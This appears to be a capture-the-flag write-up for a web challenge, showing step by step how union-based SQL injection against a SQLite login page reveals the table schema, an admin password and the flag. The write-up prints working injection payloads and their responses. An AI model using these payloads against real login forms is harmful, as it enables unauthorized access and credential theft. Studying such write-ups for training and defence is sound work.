# Secret base 1

> Category: Web

> APOCALYPSE hired an administrator improve the physical security of their secret base.
> Your task is to gain access to the physical security device.

>  The flag for this challenge is similar to Cyberthon{h...e} (starts with 'h' and ends with 'e').

This is a typical SQL injection challenge without any filters. Database is sqlite, with table `users_table` from a HTML comment in the login page.

Starting with payload `username = admin';#` we get an error that the password for `admin` is incorrect. Thus, the query executed is probably something like

```python
data = query(f"select * from users_table where username='{username}'")
if (data["password"] == password):
   # ...
```

We can use union SQL injection to control returned password. But first, we need to find out how many columns there are in the `users_table`. `username = a' union select 'a', 'b', 'c';#`  produces no error so there are 3 columns. Additionally we get a message `Invalid password for b`, so the second column is the username. Let's investigate further by dumping the SQL of the `users_table`.

````
Payload: username = a' union select 'a', sql, 'c' from sqlite_master where tbl_name='users_table';#
Response: Invalid password for CREATE TABLE users_table(id INTEGER PRIMARY KEY, username TEXT, password TEXT)!
````

Our hypothesis is correct. We can continue to use this approach to dump more info from the table.

```
Payload: username = a' union select 'a', password, 'c' from users_table;#
Response: Invalid password for Adm1nP@s5w0rd123!@#!
```

Presumably, this is the admin's password. Still no flag tho. Let's look at other users' passwords

```
Payload: username = a' union select 'a', password, 'c' from users_table where username not like 'admin';#
Response: Invalid password for Cyberthon{h3re5_0nE_f1Ag_1N_d@taBa5e}! 
```

